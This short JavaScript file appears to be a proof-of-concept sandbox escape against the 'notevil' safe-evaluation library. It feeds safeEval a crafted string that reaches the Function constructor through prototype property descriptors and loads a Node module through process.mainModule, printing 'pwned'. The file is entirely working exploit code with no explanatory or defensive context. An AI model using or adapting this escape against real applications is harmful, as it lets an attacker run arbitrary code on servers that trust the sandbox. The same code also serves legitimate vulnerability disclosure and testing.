var safeEval = require("notevil")

var code = "" +
      "function fn() {};" +
      "var constructorProperty = Object.getOwnPropertyDescriptors(fn.__proto__).constructor;" +
      "var properties = Object.values(constructorProperty);" +
      "properties.pop();" +
      "properties.pop();" +
      "properties.pop();" +
      "var Func = properties.map(function (x) {return x.bind(x, 'return this.process.mainModule.constructor._load(`util`).log(`pwned`)')}).pop();" +
      "(Func())()"
console.log(safeEval(code))
